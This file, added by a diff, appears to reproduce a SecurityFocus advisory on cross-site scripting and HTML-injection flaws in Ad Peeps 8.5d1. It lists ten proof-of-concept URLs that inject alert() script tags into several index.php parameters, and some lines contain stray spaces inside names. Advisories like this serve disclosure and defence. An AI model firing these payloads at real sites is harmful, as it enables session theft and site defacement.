@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/42071/info
+
+Impact Software Ad Peeps is prone to multiple cross-site scripting vulnerabilities and multiple HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code could run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+Ad Peeps 8.5d1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/adpeeps/index.php?uid="><script>alert(0)</script>
+http://www.example.com/adpeeps/index.php?loc=login_lookup&uid="><script>alert(0)</script>
+http://www.example.com/adpeeps/index.php?loc=adminlogin&uid="><script>alert(0)</script>
+http://www.example.com/adpeeps/index.php?loc=createcampaign&mode=new&uid=100000&c ampaignid="><script>alert(0)</script>
+http://www.example.com/adpeeps/index.php?loc=view_account_stats&uid=100000&type=" ><script>alert(2)</script>&period="><script>alert(1)</script>
+http://www.example.com/adpeeps/index.php?loc=view_adrates&uid="><script>alert(0)</script>
+http://www.example.com/adpeeps/index.php?loc=account_confirmation&accname="><scri pt>alert(1)</script>&loginpass="><script>alert(2)</script>&uid=100000
+http://www.example.com/adpeeps/index.php?loc=setup_account&e6=new&e12=bypass&e9=" ><script>alert(0)</script>
+http://www.example.com/adpeeps/index.php?loc=email_advertisers&uid=100000&mode=1& errors=&from="><script>alert(1)</script>&message=&subject="><script>alert(2)</script>
+http://www.example.com/adpeeps/index.php?loc=edit_ad_package&uid=100000&idno="><s cript>alert(0)</script>
